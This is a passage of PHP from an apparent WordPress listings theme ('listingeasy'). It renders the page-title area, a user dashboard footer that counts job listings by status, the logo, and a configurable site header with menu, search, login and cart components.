                $page_title_top_padding = !empty($header_height['height']) ? 20 + (int)$header_height['height'] + (int)$top_header_height : '';
            }else{
                $page_title_top_padding = '';
            }

        }

        if (class_exists( 'RWMB_Loader' ) && $id !== 0) {
            $page_sub_title = rwmb_meta('mb_page_sub_title');
            $mb_page_title_conditional = rwmb_meta('mb_page_title_conditional');
            if ($mb_page_title_conditional == 'yes') {
                $page_title_conditional = 'yes';
                $page_title_breadcrumbs_conditional = rwmb_meta('mb_show_breadcrumbs') == '1' ? 'yes' : 'no';
                $page_title_vert_align = rwmb_meta('mb_page_title_vertical_align');
                $page_title_horiz_align = rwmb_meta('mb_page_title_horizontal_align');
                $page_title_font_color = rwmb_meta('mb_page_title_font_color');
                $page_title_bg_color = rwmb_meta('mb_page_title_bg_color');
                $page_title_height = rwmb_meta('mb_page_title_height');

                $page_title_top_border = rwmb_meta("mb_page_title_top_border");
                $mb_page_title_top_border_color = rwmb_meta("mb_page_title_top_border_color");
                $mb_page_title_top_border_color_opacity = rwmb_meta("mb_page_title_top_border_color_opacity");

                if (!empty($mb_page_title_top_border_color) && $page_title_top_border == '1') {
                    $page_title_top_border_color['rgba'] = 'rgba('.(gt3_HexToRGB($mb_page_title_top_border_color)).','.$mb_page_title_top_border_color_opacity.')';
                }else{
                    $page_title_top_border_color = '';
                }

                $page_title_bottom_border = rwmb_meta("mb_page_title_bottom_border");
                $mb_page_title_bottom_border_color = rwmb_meta("mb_page_title_bottom_border_color");
                $mb_page_title_bottom_border_color_opacity = rwmb_meta("mb_page_title_bottom_border_color_opacity");

                if (!empty($mb_page_title_bottom_border_color) && $page_title_bottom_border == '1') {
                    $page_title_bottom_border_color['rgba'] = 'rgba('.(gt3_HexToRGB($mb_page_title_bottom_border_color)).','.$mb_page_title_bottom_border_color_opacity.')';
                }else{
                    $page_title_bottom_border_color = '';
                }

            }elseif($mb_page_title_conditional == 'no'){
                $page_title_conditional = 'no';
            }

            if (rwmb_meta('mb_customize_header_layout') == 'custom' && rwmb_meta('mb_header_on_bg') == '1') {
                if (rwmb_meta('mb_top_header_left_bar') == '1' || rwmb_meta('mb_top_header_right_bar') == '1') {
                    $top_header_height = 40;
                }else{
                    $top_header_height = 0;
                }
                $header_height = rwmb_meta("mb_header_height");
                $page_title_top_padding = !empty($header_height) ? 20 + (int)$header_height + (int)$top_header_height : '';
            }elseif(rwmb_meta('mb_customize_header_layout') == 'custom'){
                $page_title_top_padding = '';
            }
        }

        $page_title_classes = !empty($page_title_horiz_align) ? ' gt3-page-title_horiz_align_'.esc_attr($page_title_horiz_align) : 'gt3-page-title_horiz_align_left';
        $page_title_classes .= !empty($page_title_vert_align) ? ' gt3-page-title_vert_align_'.esc_attr($page_title_vert_align) : 'gt3-page-title_vert_align_middle';
        $page_title_classes .= !empty($page_title_height) && (int)$page_title_height < 80 ? ' gt3-page-title_small_header' : '';

        $page_title_styles = !empty($page_title_bg_color) ? 'background-color:'.esc_attr($page_title_bg_color).';' : '';
        $page_title_styles .= !empty($page_title_top_padding) ? 'padding-top:'.esc_attr($page_title_top_padding).'px;' : '';
        $page_title_styles .= !empty($page_title_height) ? 'height:'.esc_attr($page_title_height).'px;' : '';
        $page_title_styles .= !empty($page_title_font_color) ? 'color:'.esc_attr($page_title_font_color).';' : '';
        $page_title_styles .= !empty($page_title_bottom_margin) ? 'margin-bottom:'.esc_attr($page_title_bottom_margin).'px;' : '';

        if ($page_title_top_border == '1') {
            $page_title_styles .= !empty($page_title_top_border_color['rgba']) ? 'border-top: 1px solid '.esc_attr($page_title_top_border_color['rgba']).';' : '';
        }

        if ($page_title_bottom_border == '1') {
            $page_title_styles .= !empty($page_title_bottom_border_color['rgba']) ? 'border-bottom: 1px solid '.esc_attr($page_title_bottom_border_color['rgba']).';' : '';
        }
        $bg_styles = '';
        if (in_array($id, $dashboard_pages) && is_user_logged_in()) {
            $page_title_bg_image_array = gt3_option("dashboard_page_title_bg_image");
            $test = gt3_background_render('dashboard_page_title','mb_page_title_conditional','yes');
            $meta_conditional = 'mb_page_title_conditional';
            $meta_value = 'yes';
            $opt_name = 'page_title';
            if (class_exists( 'RWMB_Loader' ) && get_queried_object_id() !== 0) {
                if ($meta_conditional != false) {
                    $mb_conditional = rwmb_meta($meta_conditional);
                    if ($mb_conditional == $meta_value) {
                        $bg_src = rwmb_meta('mb_page_title_bg_image');
                        $bg_src = !empty($bg_src) ? $bg_src : '';
                        if (!empty($bg_src)) {
                            $bg_src = array_values($bg_src);
                            $bg_src = $bg_src[0]['url'];
                        }
                        if (!empty($bg_src)) {
                            $bg_repeat = rwmb_meta('mb_'.$opt_name.'_bg_repeat');
                            $bg_repeat = !empty($bg_repeat) ? $bg_repeat : '';
                            $bg_size = rwmb_meta('mb_'.$opt_name.'_bg_size');
                            $bg_size = !empty($bg_size) ? $bg_size : '';
                            $attachment = rwmb_meta('mb_'.$opt_name.'_bg_attachment');
                            $attachment = !empty($attachment) ? $attachment : '';
                            $position = rwmb_meta('mb_'.$opt_name.'_bg_position');
                            $position = !empty($position) ? $position : '';
                        }else{
                            $bg_repeat = '';
                            $bg_size = '';
                            $attachment = '';
                            $position = '';
                        }
                    }
                }
            }
            $bg_styles = '';
            $bg_styles .= !empty($bg_src) ? 'background-image:url('.esc_url($bg_src).');' : '';
            if (!empty($bg_src)) {
                $bg_styles .= !empty($bg_size) ? 'background-size:'.esc_attr($bg_size).';' : '';
                $bg_styles .= !empty($bg_repeat) ? 'background-repeat:'.esc_attr($bg_repeat).';' : '';
                $bg_styles .= !empty($attachment) ? 'background-attachment:'.esc_attr($attachment).';' : '';
                $bg_styles .= !empty($position) ? 'background-position:'.esc_attr($position).';' : '';
            }

            if(!empty($bg_styles)){
                $page_title_styles .= $bg_styles;
            }else{
                $page_title_styles .= gt3_background_render('dashboard_page_title','mb_page_title_conditional','yes');
            }
        }else{
            $page_title_styles .= gt3_background_render('page_title','mb_page_title_conditional','yes');
        }

        $gt3_page_title = gt3_page_title();

        /**
         * need for dashoard pages
         */

        if (in_array($id, $dashboard_pages) && is_user_logged_in()) {
            echo "<div class='gt3-page-title gt3-page-title__dashboard gt3-page-title_horiz_align_center gt3-page-title_vert_align_middle'".( !empty($page_title_styles) ? ' style="'.esc_attr($page_title_styles).';margin-bottom: 0;"' : '').">";
                echo "<div class='gt3-page-title__inner'>";
                    echo "<div class='container'>";
                        echo "<div class='gt3-page-title__content'>";
                            echo "<div class='page_title'>";
                                echo "<div class='gt3_dashboard_user_info'>";
                                    gt3_user_avatar_out(160,true);
                                echo "</div>";
                            echo "</div>";
                        echo "</div>";
                    echo "</div>";
                echo "</div>";
                echo "<div class='gt3-page-title__inner'>";
                    echo "<div class='container gt3_dashboard_footer__container'>";
                        echo "<div class='gt3_dashboard__footer'>";
                        gt3_dasgboard_footer();
                        $job_manager_submit_url = get_option( 'job_manager_submit_job_form_page_id', false );
                        $job_manager_submit_url = get_permalink($job_manager_submit_url);
                        if (!empty($job_manager_submit_url)) {
                            echo "<div class='gt3_dashboard_footer__add_listings'><a href='".esc_url($job_manager_submit_url)."'><i class='gt3_add_listings__icon'></i>".esc_html__('Add Listing', 'listingeasy')."</a></div>";
                        }
                    echo "</div>";
                    echo "</div>";
                echo "</div>";
            echo "</div>";
            echo "<div class='gt3_dashboard__wrapper'".(!empty($page_title_bottom_margin) ? ' style="margin-bottom:'.esc_attr($page_title_bottom_margin).'px;"' : '').">";
                echo "<div class='container'>";
                    echo "<div class='gt3_dasgboard_menu'>";
                        $menu_slug = gt3_option("login_select");
                        if ( !class_exists( 'Gt3_wize_core' ) ) {
                            $menu_slug = '';
                        }
                        gt3_dashboard_menu($menu_slug);
                    echo "</div>";
                echo "</div>";
            echo "</div>";
        }elseif ($page_title_conditional == 'yes' && !is_404() && !empty($gt3_page_title)) {

            echo "<div class='gt3-page-title". (!empty($page_title_classes) ? esc_attr($page_title_classes) : '' ) ."'".( !empty($page_title_styles) ? ' style="'.esc_attr($page_title_styles).'"' : '').">";
                echo "<div class='gt3-page-title__inner'>";
                    echo "<div class='container'>";
                        echo "<div class='gt3-page-title__content'>";
                            echo "<div class='page_title'><h1>";
                                echo  $gt3_page_title;
                            echo "</h1>";
                            if (!empty($page_sub_title) && $page_title_horiz_align != 'center') {
                                echo "<div class='page_sub_title'><div>";
                                echo esc_attr( $page_sub_title );
                                echo "</div></div>";
                            }
                            echo "</div>";
                            if (!empty($page_sub_title) && $page_title_horiz_align == 'center') {
                                echo "<div class='page_sub_title'><div>";
                                echo esc_attr( $page_sub_title );
                                echo "</div></div>";
                            }
                            if ($page_title_breadcrumbs_conditional == 'yes') {
                                echo "<div class='gt3_breadcrumb'>";
                                    gt3_the_breadcrumb();
                                echo "</div>";
                            }
                        echo "</div>";
                    echo "</div>";
                echo "</div>";
            echo "</div>";

        }
    }
}

function gt3_dasgboard_footer(){

    $count_posts = array();
    $args     = array(
        'post_type'           => 'job_listing',
        'post_status'         => array( 'publish'),
        'ignore_sticky_posts' => 1,
        'posts_per_page'      => -1,
        'orderby'             => 'date',
        'order'               => 'desc',
        'author'              => get_current_user_id()
    );
    $jobs = new WP_Query($args);
    $count_posts['publish'] = $jobs->found_posts;
    $args     = array(
        'post_type'           => 'job_listing',
        'post_status'         => array( 'pending' ),
        'ignore_sticky_posts' => 1,
        'posts_per_page'      => -1,
        'orderby'             => 'date',
        'order'               => 'desc',
        'author'              => get_current_user_id()
    );
    $jobs = new WP_Query($args);
    $count_posts['pending'] = $jobs->found_posts;
    $args     = array(
        'post_type'           => 'job_listing',
        'post_status'         => array( 'expired' ),
        'ignore_sticky_posts' => 1,
        'posts_per_page'      => -1,
        'orderby'             => 'date',
        'order'               => 'desc',
        'author'              => get_current_user_id()
    );
    $jobs = new WP_Query($args);
    $count_posts['expired'] = $jobs->found_posts;
    $args     = array(
        'post_type'           => 'job_listing',
        'post_status'         => array( 'pending_payment' ),
        'ignore_sticky_posts' => 1,
        'posts_per_page'      => -1,
        'orderby'             => 'date',
        'order'               => 'desc',
        'author'              => get_current_user_id()
    );
    $jobs = new WP_Query($args);
    $count_posts['pending_payment'] = $jobs->found_posts;

    $all_listings = (int)$count_posts['publish'] + (int)$count_posts['pending'] + (int)$count_posts['expired'] + (int)$count_posts['pending_payment'];
    echo "<div class='gt3_listing_count_posts__wrapper'>";
    echo "<span class='gt3_listing_count_posts gt3_listing_count_posts--all'><span>".esc_html__('All Listings','listingeasy').' ('.$all_listings.')'."</span></span>";
    echo "<span class='gt3_listing_count_posts gt3_listing_count_posts--publish'><span>".esc_html__('Published','listingeasy').' ('.$count_posts['publish'].')'."</span></span>";
    echo "<span class='gt3_listing_count_posts gt3_listing_count_posts--pending'><span>".esc_html__('Pending','listingeasy').' ('.$count_posts['pending'].')'."</span></span>";
    echo "<span class='gt3_listing_count_posts gt3_listing_count_posts--expired'><span>".esc_html__('Expired','listingeasy').' ('.$count_posts['expired'].')'."</span></span>";
    if (in_array( 'wp-job-manager-wc-paid-listings/wp-job-manager-wc-paid-listings.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) )) {
        echo "<span class='gt3_listing_count_posts gt3_listing_count_posts--pending_payment'><span>".esc_html__('Pending payment','listingeasy').' ('.$count_posts['pending_payment'].')'."</span></span>";
    }
    echo "</div>";
}



if (!function_exists('gt3_get_logo')) {
    function gt3_get_logo() {
        $header_logo_src = gt3_option("header_logo");
        $header_logo_src = !empty($header_logo_src) ? $header_logo_src['url'] : '';
        $logo_light_src = gt3_option("logo_light");
        $logo_light_src = !empty($logo_light_src) ? $logo_light_src['url'] : '';
        $logo_dark_src =  gt3_option("logo_dark");
        $logo_dark_src =  !empty($logo_dark_src) ? $logo_dark_src['url'] : '';
        $logo_sticky_src =  gt3_option("logo_sticky");
        $logo_sticky_src =  !empty($logo_sticky_src) ? $logo_sticky_src['url'] : '';
        $logo_mobile_src =  gt3_option("logo_mobile");
        $logo_mobile_src =  !empty($logo_mobile_src) ? $logo_mobile_src['url'] : '';
        $logo_limit_on_mobile = gt3_option("logo_limit_on_mobile");

        if (class_exists( 'RWMB_Loader' ) && get_queried_object_id() !== 0) {
            if (rwmb_meta('mb_customize_logo') == 'custom') {
                $mb_header_logo_src = rwmb_meta("mb_header_logo");
                if (!empty($mb_header_logo_src)) {
                    $header_logo_src = array_values($mb_header_logo_src);
                    $header_logo_src = $header_logo_src[0]['full_url'];
                }
                $mb_logo_sticky_src = rwmb_meta("mb_logo_sticky");
                if (!empty($mb_logo_sticky_src)) {
                    $logo_sticky_src = array_values($mb_logo_sticky_src);
                    $logo_sticky_src = $logo_sticky_src[0]['full_url'];
                }
                $mb_logo_mobile_src = rwmb_meta("mb_logo_mobile");
                if (!empty($mb_logo_mobile_src)) {
                    $logo_mobile_src = array_values($mb_logo_mobile_src);
                    $logo_mobile_src = $logo_mobile_src[0]['full_url'];
                }
            }
        }

        $logo_height_custom = gt3_option('logo_height_custom');
        $logo_height = gt3_option('logo_height');
        $logo_height = $logo_height['height'];
        $logo_max_height = gt3_option('logo_max_height');
        $sticky_logo_height = gt3_option('sticky_logo_height');
        $sticky_logo_height = $sticky_logo_height['height'];

        // height for logo
        $header_height = gt3_option('header_height');
        $header_height = $header_height['height'];


        if (class_exists( 'RWMB_Loader' ) && get_queried_object_id() !== 0) {
            if (rwmb_meta('mb_customize_logo') == 'custom') {
                if (rwmb_meta('mb_logo_height_custom') == '1') {
                    $logo_height_custom = rwmb_meta('mb_logo_height_custom');
                    $logo_height = rwmb_meta('mb_logo_height');
                    $logo_max_height = rwmb_meta('mb_logo_max_height');
                    $sticky_logo_height = rwmb_meta('mb_sticky_logo_height');
                }
            }
            if (rwmb_meta('mb_customize_header_layout') == 'custom') {
                $header_height = rwmb_meta("mb_header_height");
            }
        }

        if (!empty($header_height) && $logo_max_height != '1') {
            $header_height_css = ' style="max-height:'.esc_attr($header_height*0.9).'px;"';
        }else{
            $header_height_css = '';
        }

        $logo_height_style = '';
        if (!empty($logo_height) && $logo_height_custom == '1') {
            $logo_height_style .= 'height:'.(esc_attr($logo_height)).'px;';
        }
        if (!empty($header_height) && $logo_max_height != '1') {
            $logo_height_style .= 'max-height:'.esc_attr($header_height*0.9).'px;';
        }
        $logo_height_style = !empty($logo_height_style) ? ' style="'.$logo_height_style.'"' : '';



        $sticky_logo_height_style = '';
        if (!empty($sticky_logo_height) && $logo_height_custom == '1') {
            $sticky_logo_height_style .= 'height:'.(esc_attr($sticky_logo_height)).'px;';
        }elseif(!empty($logo_height) && $logo_height_custom == '1'){
            $sticky_logo_height_style .= 'height:'.(esc_attr($logo_height)).'px;';
        }
        $sticky_logo_height_style = !empty($sticky_logo_height_style) ? ' style="'.$sticky_logo_height_style.'"' : '';



        $logo_class = '';
        if ($logo_height_custom == '1' && $logo_max_height == '1' ) {
            $logo_class .= ' no_height_limit';
        }

        if ($logo_limit_on_mobile == '0') {
            $logo_class .= ' logo_mobile_not_limited';
        }

        $logo = "";
        $logo .= "<div class='logo_container".$logo_class.
        (!empty($logo_sticky_src) ? ' sticky_logo_enable' : '').
        (!empty($logo_mobile_src) ? ' mobile_logo_enable' : '')."'>";
        $logo .= "<a href='".esc_url(home_url('/'))."'".$header_height_css.">";
        if (!empty($header_logo_src)) {
            $logo .= '<img class="default_logo" src="'.esc_url($header_logo_src).'" alt="logo"'.$logo_height_style.'>';
        }else{
            $logo .= '<h1 class="site-title">';
            $logo .= get_bloginfo( 'name' );
            $logo .= '</h1>';
        }
        if (!empty($logo_sticky_src)) {
            $logo .= '<img class="sticky_logo" src="'.esc_url($logo_sticky_src).'" alt="logo"'.$sticky_logo_height_style.'>';
        }
        if (!empty($logo_mobile_src)) {
            $logo .= '<img class="mobile_logo" src="'.esc_url($logo_mobile_src).'" alt="logo"'.$logo_height_style.'>';
        }
        $logo .= "</a>";
        $logo .= "</div>";
        return $logo;
    }
}

if (!function_exists('gt3_get_header_builder_text_component')) {
    function gt3_get_header_builder_text_component($index){
        $out = '';
        $out .= '<div class="gt3_header_builder_component gt3_header_builder_text_component">';
        $out .= gt3_option("text".$index."_editor");
        $out .= '</div>';
        return $out;
    }
}

if (!function_exists('gt3_get_header_builder')) {
    function gt3_get_header_builder($id){
        $gt3_header_builder_array = gt3_option("gt3_header_builder_id");
        $preset = '';
        //check if preset set in metabox
        if (class_exists( 'RWMB_Loader' ) && $id !== 0) {
            $mb_header_presets = rwmb_meta('mb_header_presets');
            if ($mb_header_presets != 'default' && !empty($mb_header_presets)) {
                $presets = gt3_header_presets ();
                if (!empty($presets)) {
                    $preset = json_decode($presets[$mb_header_presets],true);
                    $gt3_header_builder_array = gt3_option_presets($preset,'gt3_header_builder_id');
                }
            }
        }
        if (!empty($gt3_header_builder_array)) {

            $header_sections = array();

            /* header builder main settings */
            $header_full_width = (bool)gt3_option('header_full_width');
            $header_sticky = (bool)gt3_option('header_sticky');
            $header_on_bg = false;
            /* end header builder main settings */

            /* header builder component */

            // LOGO
            $logo = gt3_get_logo();

            //MENU
            $menu_slug = gt3_option("menu_select");
            if ( !class_exists( 'Gt3_wize_core' ) ) {
                $menu_array = get_nav_menu_locations();
                if (!empty($menu_array) && is_array($menu_array) && !empty($menu_array['main_menu'])) {
                    $menu_slug = $menu_array['main_menu'];
                }else{
                    $menu_slug = '';
                }
            }
            $menu_ative_top_line = gt3_option('menu_ative_top_line');

            // Burger sidebar
            $is_burger_sidebar = false;
            $sidebar = gt3_option("burger_sidebar_select");
            //login
            $is_login = false;

            /* end header builder component */

            /* sticky */
            if ($header_sticky) {
                $options['header_sticky'] = $header_sticky;
                $header_sticky_appearance_style = gt3_option('header_sticky_appearance_style');
                $header_sticky_appearance_number = gt3_option('header_sticky_appearance_number');
                $header_sticky_appearance_number = (gt3_option('header_sticky_appearance_from_top') == 'custom') && !empty($header_sticky_appearance_number) ? $header_sticky_appearance_number['height'] : '';
                $header_sticky_shadow = gt3_option('header_sticky_shadow');
            }
            /* end sticky */

            // change option by option from metabox
            if (class_exists( 'RWMB_Loader' ) && $id !== 0) {
                if ($mb_header_presets != 'default' && !empty($mb_header_presets)) {
                    $header_full_width = (bool)gt3_option_presets($preset,'header_full_width');
                    $header_sticky = (bool)gt3_option_presets($preset,'header_sticky');
                    $menu_slug = gt3_option_presets($preset,"menu_select");
                    $menu_ative_top_line = gt3_option_presets($preset,'menu_ative_top_line');
                    $sidebar = gt3_option_presets($preset,"burger_sidebar_select");
                }

                $mb_customize_header_layout = rwmb_meta('mb_customize_header_layout');
                if ($mb_customize_header_layout == 'none') {
                    return false;
                }
                $header_on_bg = rwmb_meta('mb_header_on_bg');
            }

            echo "<div class='gt3_header_builder".((bool)$header_on_bg ? ' header_over_bg' : '')."'>";

                $options = array('gt3_header_builder_array' => $gt3_header_builder_array );
                $options['header_full_width'] = $header_full_width;
                $options['logo'] = $logo;
                $options['menu_slug'] = $menu_slug;
                $options['menu_ative_top_line'] = $menu_ative_top_line;
                $options['header_sticky'] = false;
                if (!empty($preset)) {
                    $options['preset'] = $preset;
                }else{
                    $options['preset'] = '';
                }


                $gt3_header_builder_out_array = gt3_header_builder__container($options);
                $is_burger_sidebar = $gt3_header_builder_out_array['is_burger_sidebar'];
                $is_login = $gt3_header_builder_out_array['is_login'];
                $is_header_menu = $gt3_header_builder_out_array['is_header_menu'];
                echo  $gt3_header_builder_out_array['header_out'];
                if ($header_sticky) {
                    $options['header_sticky'] = (bool)$header_sticky;
                    echo "<div class='sticky_header".($header_sticky_shadow == '1' ? ' header_sticky_shadow' : '')."'".(!empty($sticky_styles) ? $sticky_styles : '').(!empty($header_sticky_appearance_style) ? ' data-sticky-type="'.esc_attr($header_sticky_appearance_style).'"' : '').(!empty($header_sticky_appearance_number) ? ' data-sticky-number="'.((int)$header_sticky_appearance_number).'"' : '').">";

                    $gt3_header_builder_out_array = gt3_header_builder__container($options);
                    echo  $gt3_header_builder_out_array['header_out'];
                    echo "</div>";
                }
                if ($is_header_menu && !empty($menu_slug)) {
                    ob_start();
                        gt3_header_builder_menu($menu_slug);
                    $menu = ob_get_clean();
                    if (!empty($menu)) {
                        echo "<div class='mobile_menu_container'>";
                            echo  $header_full_width ? "<div class='fullwidth-wrapper'>":"<div class='container'>";
                                echo "<div class='gt3_header_builder_component gt3_header_builder_menu_component'><nav class='main-menu main_menu_container".($menu_ative_top_line == '1' ? ' menu_line_enable' : '')."'>";
                                echo  $menu;
                                echo "</nav>";
                                echo '</div>';
                            echo '</div>';
                        echo '</div>';
                    }
                }
            echo "</div>";
            if ($is_burger_sidebar) {
                echo '<div class="gt3_header_builder__burger_sidebar">';
                    echo '<div class="gt3_header_builder__burger_sidebar-cover"></div>';
                    echo '<div class="gt3_burger_sidebar_container">';
                        if (is_active_sidebar( $sidebar )) {
                            echo "<aside class='sidebar'>";
                            dynamic_sidebar( $sidebar );
                            echo "</aside>";
                        }
                    echo '</div>';
                echo '</div>';
            }
            if ($is_login) {
                if (!gt3_is_lwa()) {
                    if (!is_user_logged_in()) {
                        echo "<div class='gt3_header_builder__login-modal ".(get_option('woocommerce_enable_myaccount_registration') !='yes' ? ' without_register' : '').(is_user_logged_in() ? ' user_logged_in' : 'user_logged_out').(in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ? '' : 'not_woo')."'>";
                            echo "<div class='gt3_header_builder__login-modal-cover'></div>";
                            echo "<div class='gt3_header_builder__login-modal_container container'>";
                                echo "<div class='gt3_header_builder__login-modal-close'></div>";
                                if ( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
                                    /*if ( is_user_logged_in() ) {
                                        wc_get_template('myaccount/navigation.php');
                                    }*/
                                    if (!is_user_logged_in()) {
                                        echo do_shortcode('[woocommerce_my_account]');
                                    }
                                }
                                gt3_social_login_out();
                            echo "</div>";

                        echo "</div>";
                    }
                }

            }

        }
    }
}


if (!function_exists('gt3_header_builder__container')) {
    function gt3_header_builder__container($options = null) {
        extract($options);
        $header_sections = array();
        $is_burger_sidebar = false;
        $is_login = false;
        $is_header_menu = false;
        ob_start();
        echo "<div class='gt3_header_builder__container'>";

            foreach ($gt3_header_builder_array as $side => $value) {


                if (!empty($gt3_header_builder_array[$side]['content']) && $side != 'all_item' ) {

                    $side_out = '';

                    if (count($gt3_header_builder_array[$side]['content']) == 1 && empty($gt3_header_builder_array[$side]['content']['placebo']) || count($gt3_header_builder_array[$side]['content']) > 1) {
                        //get level and position of menu part
                        $full_position = explode('_', $side, 2);
                        $level = !empty($full_position[0]) ? $full_position[0] : '';
                        $position = !empty($full_position[1]) ? $full_position[1] : '';

                        if ($header_sticky) {
                            if (!empty($preset)) {
                                $enable_section_in_sticky = (bool)gt3_option_presets($preset,"side_".$level."_sticky");
                            }else{
                                $enable_section_in_sticky = (bool)gt3_option("side_".$level."_sticky");
                            }

                        }else{
                            $enable_section_in_sticky = true;
                        }

                        if ($enable_section_in_sticky) {

                            $side_class = '';
                            $side_class .= sanitize_html_class($side);
                            $side_class .= !empty($position) ? ' '.sanitize_html_class($position) : '';

                            if (!empty($preset)) {
                                $side_align = gt3_option_presets($preset,$side."-align");
                            }else{
                                $side_align = gt3_option($side."-align");
                            }

                            if ($side_align != $position) {
                                $side_class .= ' header_side--custom-align header_side--'.$side_align.'-align';
                            }

                                $side_content_out = '';
                                ob_start();
                                foreach ($gt3_header_builder_array[$side]['content'] as $key => $value) {
                                    if ($key != 'placebo' && $key != 'undefined') {

                                            switch ($key) {
                                                case 'left_bar':
                                                    echo !empty($bottom_header_left) ? $bottom_header_left  : '';
                                                    break;
                                                case 'logo':
                                                    echo !empty($logo) ? $logo : '';
                                                    break;
                                                case 'menu':
                                                    if (!empty($menu_slug)) {
                                                        $is_header_menu = true;
                                                            echo "<div class='gt3_header_builder_component gt3_header_builder_menu_component'><nav class='main-menu main_menu_container".($menu_ative_top_line == '1' ? ' menu_line_enable' : '')."'>";
                                                            if ( class_exists( 'Gt3_wize_core' ) ) {
                                                                gt3_header_builder_menu($menu_slug);
                                                            }else{
                                                                if (has_nav_menu( 'main_menu' )) {
                                                                    gt3_main_menu();
                                                                }
                                                            }
                                                            echo  "</nav>";
                                                            echo '<div class="mobile-navigation-toggle"><div class="toggle-box"><div class="toggle-inner"></div></div></div></div>';

                                                    }
                                                    break;
                                                case 'button':
                                                    $button_page = gt3_option('button_select');
                                                    $button_icon = gt3_option('icon_select__button');
                                                    if (!empty($button_page)) {
                                                        echo "<div class='gt3_header_builder_component gt3_header_builder_button_component'><div class='gt3_module_button button_alignment_inline'><a class='button_size_small btn_icon_position_left' href='".esc_url(get_permalink($button_page))."' style='border-width: 1px; border-style: solid; border-radius: 30px;'><div class='btn_icon_container'>".(!empty($button_icon) ? "<span class='gt3_btn_icon ".$button_icon."' style='font-size: 12px; line-height: 14px;'></span>" : "")."</div><span class='gt3_btn_text'>".esc_html__('Add Listing', 'listingeasy')."</span></a></div></div>";
                                                    }
                                                    break;
                                                case 'search':
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_search_component">'.do_shortcode('[gt3_search]').'</div>';
                                                    break;
                                                case 'search_jobs':
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_search_component">'.do_shortcode('[gt3_listing_search]').'</div>';
                                                    break;
                                                case 'login':
                                                    $is_login = true;
                                                    $login_class = '';
                                                    $login_container = '';
                                                    if ( gt3_is_lwa() ) {
                                                        if ( ! is_user_logged_in() ) {
                                                            $login_class .= ' lwa-links-modal';
                                                        }
                                                        $login_class .= ' lwa-login-link';
                                                        $login_container .= ' lwa';
                                                    }
                                                    if (! is_user_logged_in() &&
                                                        !gt3_is_lwa() &&
                                                        !in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) )) {
                                                        $login_link = get_permalink();
                                                        $login_link = $login_link == 0 ? home_url() : $login_link;
                                                        $url = esc_url( wp_login_url( $login_link ) );
                                                    }else{
                                                       $url = '';
                                                    }

                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_login_component'.esc_attr($login_container).'">';
                                                    if (!is_user_logged_in()) {
                                                        echo !empty($url) ?'<a href="'.$url.'">' : '';
                                                        echo '<i class="gt3_login_icon'.esc_attr($login_class).'"></i>';
                                                        echo !empty($url) ? "</a>" : "";
                                                    }else{
                                                        gt3_user_avatar_out();
                                                        gt3_dashboard_out();
                                                    }
                                                    echo "</div>";
                                                    break;
                                                case 'cart':
                                                    ///////
                                                    if ( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
                                                        ob_start();
                                                            woocommerce_mini_cart();
                                                        $woo_mini_cart = ob_get_clean();
                                                        ob_start();
                                                            ?>
                                                            <a class="woo_icon" href="<?php echo esc_url( WC()->cart->get_cart_url() ); ?>" title="<?php esc_html_e( 'View your shopping cart', 'listingeasy' ); ?>"><i class='woo_mini-count'><?php echo ((WC()->cart->cart_contents_count > 0) ?  '<span>' . esc_html( WC()->cart->cart_contents_count ) .'</span>' : '') ?></i></a>
                                                            <?php
                                                        $woo_mini_icon = ob_get_clean();
                                                        ///////

                                                        echo '<div class="gt3_header_builder_component gt3_header_builder_cart_component">';
                                                        echo  $woo_mini_icon;
                                                        echo '<div class="gt3_header_builder_cart_component__cart">';
                                                            echo '<div class="gt3_header_builder_cart_component__cart-container">';
                                                                echo  $woo_mini_cart;
                                                            echo '</div>';
                                                        echo '</div>';
                                                        echo '</div>';
                                                    }
                                                    break;
                                                case 'burger_sidebar':
                                                    $is_burger_sidebar = true;
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_burger_sidebar_component"><i class="burger_sidebar_icon"><span class="first"></span><span class="second"></span><span class="third"></span></i></div>';
                                                    break;
                                                case 'text1':
                                                    $text1_out = gt3_get_header_builder_text_component(1);
                                                    echo !empty($text1_out) ? do_shortcode($text1_out)  : '';
                                                    break;
                                                case 'text2':
                                                    $text2_out = gt3_get_header_builder_text_component(2);
                                                    echo !empty($text2_out) ? do_shortcode($text2_out)  : '';
                                                    break;
                                                case 'text3':
                                                    $text3_out = gt3_get_header_builder_text_component(3);
                                                    echo !empty($text3_out) ? do_shortcode($text3_out)  : '';
                                                    break;
                                                case 'text4':
                                                    $text4_out = gt3_get_header_builder_text_component(4);
                                                    echo !empty($text4_out) ? do_shortcode($text4_out)  : '';
                                                    break;
                                                case 'text5':
                                                    $text5_out = gt3_get_header_builder_text_component(5);
                                                    echo !empty($text5_out) ? do_shortcode($text5_out)  : '';
                                                    break;
                                                case 'text6':
                                                    $text6_out = gt3_get_header_builder_text_component(6);
                                                    echo !empty($text6_out) ? do_shortcode($text6_out)  : '';
                                                    break;
                                                case 'delimiter1':
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_delimiter_component"></div>';
                                                    break;
                                                case 'delimiter2':
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_delimiter_component"></div>';
                                                    break;
                                                case 'delimiter3':
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_delimiter_component"></div>';
                                                    break;
                                                case 'delimiter4':
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_delimiter_component"></div>';
                                                    break;
                                                case 'delimiter5':
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_delimiter_component"></div>';
                                                    break;
                                                case 'delimiter6':
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_delimiter_component"></div>';
                                                    break;

                                                case 'empty_space1':
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_empty_space_component"></div>';
                                                    break;
                                                case 'empty_space2':
                                                    echo '<div class="gt3_header_builder_component gt3_header_builder_empty_space_component"></div>';
                                                    break;
                                                case 'empty_space3':
